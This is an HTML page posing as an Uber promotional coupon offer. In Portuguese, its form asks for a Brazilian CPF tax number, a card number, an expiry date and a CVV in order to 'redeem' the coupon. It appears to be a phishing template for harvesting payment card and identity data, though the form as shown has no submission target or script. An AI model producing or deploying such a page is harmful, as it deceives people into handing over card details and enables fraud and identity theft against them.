<!DOCTYPE html>
<html>
<head>
	<meta charset="UTF-8">
	<title>CUPON PROMOCIONAL UBER</title>
	<style>
		body {
			background-image: url("https://mercadoeconsumo.com.br/wp-content/uploads/2021/02/bigstock-Uber-Driver-Holding-Smartphone-345479947.jpg");
			background-size: cover;
			background-position: center;
			background-repeat: no-repeat;
			font-family: sans-serif;
			margin: 0;
			padding: 0;
		}

		.container {
			display: flex;
			flex-direction: column;
			align-items: center;
			justify-content: center;
			height: 100vh;
		}

		h1 {
			color: white;
			font-size: 3rem;
			margin-bottom: 2rem;
		}

		form {
			display: flex;
			flex-direction: column;
			align-items: center;
			background-color: white;
			padding: 2rem;
			border-radius: 10px;
			box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
			max-width: 500px;
			width: 100%;
		}

		input[type="text"] {
			width: 100%;
			max-width: 400px;
			padding: 0.5rem;
			margin: 0.5rem 0;
			border: 1px solid #ccc;
			border-radius: 5px;
			box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
			font-size: 1rem;
		}

		input[type="submit"] {
			width: 100%;
			max-width: 400px;
			padding: 0.5rem;
			margin: 1rem 0;
			background-color: #4CAF50;
			color: white;
			font-size: 1.2rem;
			font-weight: bold;
			border: none;
			border-radius: 5px;
			box-shadow: 2px 2px 5px rgba(0,0,0,0.3);
			cursor: pointer;
		}

		input[type="submit"]:hover {
			background-color: #3e8e41;
		}

	</style>
</head>
<body>
	<div class="container">
		<h1>CUPON PROMOCIONAL UBER</h1>
		<form>
			<label for="cpf">CPF</label>
			<input type="text" id="cpf" name="cpf" required>
			<label for="cartao">CART√ÉO</label>
			<input type="text" id="cartao" name="cartao" required>
			<label for="validade">VALIDADE</label>
			<input type="text" id="validade" name="validade" required>
			<label for="cvv">CVV</label>
			<input type="text" id="cvv" name="cvv" required>
			<input type="submit" value="RESGATAR CUPON">
		</form>
	</div>
</body>
</html>
